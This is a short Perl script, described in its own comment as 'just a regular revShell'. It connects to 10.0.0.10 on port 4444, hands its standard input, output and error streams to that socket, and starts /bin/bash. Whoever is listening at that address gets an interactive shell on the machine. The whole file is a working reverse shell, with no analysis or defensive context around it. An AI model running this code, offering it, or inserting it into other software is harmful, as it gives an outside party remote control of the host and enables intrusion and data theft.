#!/usr/bin/perl -w
use IO::Socket::INET;
my $ip = "10.0.0.10";
my $port = 4444;
my $sock = IO::Socket::INET->new("$ip:$port");
open($_, ">&", $sock) for qw(STDIN STDOUT STDERR);
exec "/bin/bash";

#just a regular revShell, anything ll work
